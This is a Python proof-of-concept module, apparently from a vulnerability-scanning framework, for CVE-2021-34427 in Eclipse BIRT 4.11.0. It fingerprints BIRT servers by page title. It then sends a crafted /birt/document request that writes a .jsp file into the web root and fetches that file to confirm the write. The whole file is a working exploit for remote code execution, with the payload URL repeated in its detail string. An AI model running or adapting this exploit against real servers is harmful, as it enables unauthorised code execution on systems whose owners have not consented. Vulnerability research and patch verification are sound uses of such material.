from PocUtils import PocType, Severity
from PocUtils.Http import Http
from urllib.parse import urljoin


class Poc:
    def __init__(self):
        self.poc_type = PocType.http
        self.target = ""
        self.severity = Severity.critical
        self.detail = """
```
# 创建CVE-2021-34427.jsp文件
/birt/document?__report=test.rptdesign&sample=<@urlencode_all>CVE-2021-34427<@/urlencode_all>&__document=./CVE-2021-34427.jsp
```

https://mp.weixin.qq.com/s?__biz=MzkwMjQyMDA5Nw==&mid=2247485052&idx=1&sn=635488a91c5759bbc908a9e361c6ebd7&chksm=c0a48592f7d30c84acd2c64786be2d0f14eca9798aa2b02f32156a6a5dca380fd5812c813150&mpshare=1&scene=24&srcid=0102aOv14DsEkODCmeIIzRSF&sharer_sharetime=1672657162987&sharer_shareid=2b2bdaea1a2309b44abb0f62378a166e#rd
"""
        self.name = "Eclipse (BIRT) 4.11.0 RCE"

    def check(self):
        client = Http()
        client.url = self.target
        resp = client.get()
        if "<TITLE>Eclipse BIRT Home</TITLE>" in resp.text:
            return True
        else:
            return False

    def exploit(self):
        client = Http()
        client.url = urljoin(self.target, "/birt/document?__report=test.rptdesign&sample=<@urlencode_all>CVE-2021-34427<@/urlencode_all>&__document=./test.jsp")
        client.get()
        client = Http()
        client.url = urljoin(self.target, "/test.jsp")
        resp = client.get()
        if resp.status_code == 200:
            print(resp.url)
        if "CVE-2021-34427" in resp.text:
            return True
        else:
            return False
